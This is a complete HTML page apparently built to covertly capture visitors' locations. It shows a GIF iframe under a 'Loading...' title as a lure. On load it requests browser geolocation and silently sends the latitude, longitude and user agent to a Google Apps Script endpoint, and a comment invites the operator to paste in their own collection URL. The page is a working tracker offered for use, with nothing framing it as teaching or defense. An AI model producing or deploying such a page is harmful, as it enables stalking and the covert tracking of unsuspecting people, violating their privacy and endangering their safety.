<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Loading...</title>
</head>
<body onload="getLocation()">

  <iframe src="https://giphy.com" width="480" height="360" frameBorder="0"></iframe>

  <script>
    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(showPosition);
      }
    }

    function showPosition(position) {
      // PASTE YOUR GOOGLE WEB APP URL BETWEEN THE QUOTES BELOW
      var scriptURL = "https://script.google.com/macros/s/AKfycbwS_fA9Y9xPljuS7xuHxzFnH4YZny8xuZzjMGh-P8gUBaogcINXW9-Rtc4-VjkYC4K6NQ/exec";
      
      var url = scriptURL + 
                "?lat=" + position.coords.latitude + 
                "&long=" + position.coords.longitude + 
                "&uagent=" + encodeURIComponent(navigator.userAgent);

      fetch(url, { mode: "no-cors" });
    }
  </script>

</body>
</html>
